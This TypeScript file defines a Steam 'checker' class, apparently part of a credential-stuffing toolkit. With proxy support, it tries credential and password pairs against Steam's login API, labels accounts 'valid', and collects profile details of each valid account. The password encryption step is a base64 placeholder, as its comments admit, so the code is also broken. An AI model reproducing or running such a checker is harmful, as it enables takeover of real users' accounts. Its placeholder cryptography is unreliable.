import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class SteamChecker extends BaseChecker {
  constructor(proxy?: any, timeout?: number) {
    super('steam', proxy, timeout);
  }

  async check(credential: string, password: string): Promise<CheckResult> {
    return this.checkWithFallback(
      credential,
      password,
      this.checkWithCredential.bind(this),
      // Steam accepts both email and username in the same field, so no fallback needed
      undefined
    );
  }

  private async checkWithCredential(credential: string, password: string): Promise<CheckResult> {
    try {
      // Steam login process - Step 1: Get RSA public key
      const rsaResponse = await this.client.post(
        'https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/',
        new URLSearchParams({
          account_name: credential,
        }).toString(),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
        }
      );

      if (!rsaResponse.data?.response?.publickey_exp || !rsaResponse.data?.response?.publickey_mod) {
        return this.createResult(credential, password, 'steam', 'invalid');
      }

      // Step 2: Encrypt password with RSA (simplified - in production, you'd use proper RSA encryption)
      const encryptedPassword = await this.encryptPassword(
        password,
        rsaResponse.data.response.publickey_mod,
        rsaResponse.data.response.publickey_exp
      );

      // Step 3: Begin authentication session
      const authResponse = await this.client.post(
        'https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/',
        new URLSearchParams({
          account_name: credential,
          encrypted_password: encryptedPassword,
          encryption_timestamp: rsaResponse.data.response.timestamp,
          remember_login: 'true',
          platform_type: '2', // Web platform
        }).toString(),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
        }
      );

      if (authResponse.data?.response?.steamid) {
        const capture = await this.getAccountDetails(authResponse.data.response.steamid);
        return this.createResult(credential, password, 'steam', 'valid', capture);
      }

      if (authResponse.data?.response?.requires_twofactor) {
        return this.createResult(credential, password, 'steam', 'valid', {
          twoFactorEnabled: true,
        });
      }

      return this.createResult(credential, password, 'steam', 'invalid');
    } catch (error: any) {
      return this.handleError(error, credential, password);
    }
  }

  private async encryptPassword(password: string, modulus: string, exponent: string): Promise<string> {
    try {
      // Simplified password encryption - in production, use proper RSA encryption
      // For now, return base64 encoded password as placeholder
      return Buffer.from(password).toString('base64');
    } catch {
      return Buffer.from(password).toString('base64');
    }
  }

  private async getAccountDetails(steamId: string) {
    try {
      // Get player summaries (this would require Steam API key in production)
      const response = await this.client.get(
        `https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v2/`,
        {
          params: { 
            steamids: steamId,
            // In production, you'd need: key: 'YOUR_STEAM_API_KEY'
          },
        }
      );

      const player = response.data?.response?.players?.[0];
      
      return {
        username: player?.personaname,
        steamId: steamId,
        steamBalance: 0, // Would need Steam Store API
        level: player?.player_level,
        createdDate: player?.timecreated ? new Date(player.timecreated * 1000).toISOString() : undefined,
        lastLogin: player?.lastlogoff ? new Date(player.lastlogoff * 1000).toISOString() : undefined,
        country: player?.loccountrycode,
        profileUrl: player?.profileurl,
        avatar: player?.avatarfull,
      };
    } catch {
      return {
        steamId: steamId,
      };
    }
  }
}
